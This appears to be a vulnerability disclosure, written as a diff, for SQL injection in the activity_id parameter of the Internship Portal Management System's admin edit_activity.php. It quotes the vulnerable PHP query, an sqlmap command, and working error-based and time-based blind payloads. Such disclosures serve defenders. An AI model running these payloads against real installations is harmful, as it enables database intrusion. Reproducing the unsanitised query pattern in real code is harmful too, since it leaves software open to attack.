@@ -1,0 +1,36 @@
+Internship Portal Management System - SQL Injection on (admin/edit_activity.php?activity_id=1) 
+
+Vendor Homepage:
+
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+edit_activity.php 
+On this page,activity_id parameter is vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/edit_activity.php):
+<?php
+	$q_activity = $conn->query("SELECT * FROM `activity` WHERE `activity_id` = '$_REQUEST[activity_id]'") or die($conn->error);
+	$f_activity = $q_activity->fetch_array();
+?>
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+-> sqlmap -u http://localhost/intern_sys/admin/edit_activity.php?activity_id=1 --batch
+
+Output:
+---
+Parameter: activity_id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: activity_id=1' AND GTID_SUBSET(CONCAT(0x716a766271,(SELECT (ELT(7692=7692,1))),0x716b6a7171),7692)-- MjlX
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: activity_id=1' AND (SELECT 8537 FROM (SELECT(SLEEP(5)))VdHg)-- gjQm
+---
+[08:47:49] [INFO] the back-end DBMS is MySQL
